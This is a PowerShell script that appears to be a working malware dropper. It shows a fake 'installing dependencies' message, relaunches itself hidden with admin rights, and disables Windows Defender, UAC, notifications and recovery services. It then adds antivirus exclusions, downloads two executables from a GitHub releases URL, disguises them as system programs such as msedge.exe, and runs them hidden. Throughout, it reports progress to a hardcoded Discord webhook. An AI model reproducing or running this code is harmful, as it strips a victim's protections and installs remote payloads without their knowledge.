# Define constants
$WEBHOOK_URL = 'https://discord.com/api/webhooks/1411831853316309032/Aa7_D6ww5IFImc16J8FasyThHIiNz07KRCT1K3fmwQYZC1SwaL35u0RHKMbQuaZKcYYy'
$PROGRAM_FILES = "C:\Program Files"
$EXE_NAMES = @("msedge.exe", "notepad.exe", "calc.exe", "explorer.exe", "mspaint.exe", "winword.exe", "excel.exe")
$DOWNLOAD_URLS = @{
    "scripthelper" = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
    "handler" = "https://github.com/skiddyskid111/resources/releases/download/adadad/handler.exe"
}

function Send-WebhookMessage {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Message
    )
    
    $body = @{ content = $Message } | ConvertTo-Json -Depth 10
    try {
        Invoke-WebRequest -Uri $WEBHOOK_URL -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -ErrorAction Stop | Out-Null
        return $true
    }
    catch {
        Write-Warning "Failed to send webhook message: $_"
        return $false
    }
}

function Check-AdminPrivileges {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    Send-WebhookMessage -Message "Admin check: $isAdmin"
    
    if (-not $isAdmin) {
        # Display message box only if not running as admin
        Add-Type -AssemblyName System.Windows.Forms
        $msgBox = [System.Windows.Forms.MessageBox]::Show(
            "Installing dependencies, please wait 1-3 minutes. The window may close; this is normal.",
            "Script Information",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Information,
            [System.Windows.Forms.MessageBoxDefaultButton]::Button1,
            [System.Windows.Forms.MessageBoxOptions]::ServiceNotification
        )
        
        try {
            Send-WebhookMessage -Message "Attempting elevation"
            Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -ErrorAction Stop
            Send-WebhookMessage -Message "Elevation successful"
            exit
        }
        catch {
            Send-WebhookMessage -Message "Elevation failed: $($_.Exception.Message)"
            exit 1
        }
    }
}

function Disable-Notifications {
    Send-WebhookMessage -Message "Disabling all app notifications"
    try {
        $settingsPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings"
        Set-ItemProperty -Path $settingsPath -Name "NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK" -Value 0 -ErrorAction Stop
        Set-ItemProperty -Path $settingsPath -Name "NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND" -Value 0 -ErrorAction Stop
        Set-ItemProperty -Path $settingsPath -Name "NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK" -Value 0 -ErrorAction Stop
        Set-ItemProperty -Path "$settingsPath\Windows.Security.Health*App" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
        
        Get-ChildItem -Path $settingsPath | ForEach-Object {
            Set-ItemProperty -Path $_.PSPath -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
            Set-ItemProperty -Path $_.PSPath -Name "ShowInActionCenter" -Value 0 -ErrorAction SilentlyContinue
        }
        Send-WebhookMessage -Message "All app notifications disabled"
    }
    catch {
        Send-WebhookMessage -Message "Error disabling notifications: $($_.Exception.Message)"
    }
}

function Disable-WindowsDefender {
    Send-WebhookMessage -Message "Disabling Windows Defender"
    if (-not (Get-Service -Name "WinDefend" -ErrorAction SilentlyContinue)) {
        Send-WebhookMessage -Message "Windows Defender service not found, skipping"
        return
    }
    
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -ErrorAction SilentlyContinue
        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force -ErrorAction SilentlyContinue | Out-Null
        $defenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        Set-ItemProperty -Path $defenderPath -Name "DisableAntiSpyware" -Value 1 -ErrorAction Stop
        Set-ItemProperty -Path $defenderPath -Name "AllowFastServiceStartup" -Value 0 -ErrorAction Stop
        Set-ItemProperty -Path $defenderPath -Name "DisableRealtimeMonitoring" -Value 1 -ErrorAction Stop
        Set-ItemProperty -Path $defenderPath -Name "DisableRoutinelyTakingAction" -Value 1 -ErrorAction Stop
        
        Stop-Service -Name "WinDefend" -Force -ErrorAction Stop
        Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction Stop
        
        foreach ($service in @("WdNisSvc", "Sense")) {
            if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
                Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
                Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
            }
        }
        
        if (Get-Command "Set-MpPreference" -ErrorAction SilentlyContinue) {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction Stop
            Set-MpPreference -DisableScriptScanning $true -ErrorAction Stop
            Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction Stop
            Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction Stop
        }
        else {
            Send-WebhookMessage -Message "Set-MpPreference not found, skipping Defender preference settings"
        }
        Send-WebhookMessage -Message "Windows Defender disabled"
    }
    catch {
        Send-WebhookMessage -Message "Error disabling Windows Defender: $($_.Exception.Message)"
    }
}

function Disable-UACAndRecovery {
    Send-WebhookMessage -Message "Disabling UAC and recovery services"
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction Stop
        & reagentc /disable | Out-Null
        
        foreach ($service in @("Wecsvc", "WinREAgent")) {
            if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
                Stop-Service -Name $service -Force -ErrorAction Stop
                Set-Service -Name $service -StartupType Disabled -ErrorAction Stop
            }
            else {
                Send-WebhookMessage -Message "$service service not found, skipping"
            }
        }
        Send-WebhookMessage -Message "UAC and recovery services disabled"
    }
    catch {
        Send-WebhookMessage -Message "Error disabling UAC/services: $($_.Exception.Message)"
    }
}

function Add-DefenderExclusions {
    if (-not (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue)) {
        Send-WebhookMessage -Message "Add-MpPreference not found, skipping exclusion settings"
        return $false
    }
    
    $exclusionsAdded = $true
    $paths = @($env:TEMP, $env:APPDATA, $env:LOCALAPPDATA)
    $dirs = Get-ChildItem -Path $PROGRAM_FILES -Directory | Where-Object { $_.Name -notlike "Windows*" -and $_.Name -notlike "ModifiableWindowsApps" }
    $paths += $dirs.FullName
    
    foreach ($path in $paths) {
        try {
            Add-MpPreference -ExclusionPath $path -ErrorAction Stop
            Send-WebhookMessage -Message "Added exclusion: $path"
        }
        catch {
            $exclusionsAdded = $false
            Send-WebhookMessage -Message "Error adding exclusion for ${path}: $($_.Exception.Message)"
        }
    }
    return $exclusionsAdded
}

function Execute-Exe {
    param (
        [Parameter(Mandatory=$true)]
        [string]$ExeName,
        [Parameter(Mandatory=$true)]
        [string]$Url
    )
    
    $selectedExe = $EXE_NAMES | Get-Random
    $destinationPath = Join-Path -Path $env:LOCALAPPDATA -ChildPath $selectedExe
    
    if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
        try {
            Add-MpPreference -ExclusionPath $destinationPath -ErrorAction Stop
            Send-WebhookMessage -Message "Added exclusion for download path: $destinationPath"
        }
        catch {
            Send-WebhookMessage -Message "Error adding exclusion for ${destinationPath}: $($_.Exception.Message)"
        }
    }
    
    try {
        Invoke-WebRequest -Uri $Url -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop
        Send-WebhookMessage -Message "Downloaded $ExeName to $destinationPath"
        
        # Verify file exists before attempting to execute
        if (Test-Path -Path $destinationPath) {
            $process = Start-Process -FilePath $destinationPath -WindowStyle Hidden -PassThru -ErrorAction Stop
            Send-WebhookMessage -Message "Executed $ExeName with PID: $($process.Id)"
            # Wait briefly to ensure process starts
            Start-Sleep -Milliseconds 500
        }
        else {
            Send-WebhookMessage -Message "Error: $ExeName file not found at $destinationPath after download"
        }
    }
    catch {
        Send-WebhookMessage -Message "Error downloading or executing ${ExeName}: $($_.Exception.Message)"
    }
}

# Main execution
try {
    Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Check-AdminPrivileges
    Disable-Notifications
    Disable-WindowsDefender
    Disable-UACAndRecovery
    if (Add-DefenderExclusions) {
        foreach ($exe in $DOWNLOAD_URLS.GetEnumerator()) {
            Execute-Exe -ExeName $exe.Key -Url $exe.Value
            # Add delay between executions to prevent conflicts
            Start-Sleep -Seconds 1
        }
    }
    Send-WebhookMessage -Message "Script completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
}
catch {
    Send-WebhookMessage -Message "Unexpected error: $($_.Exception.Message)"
}
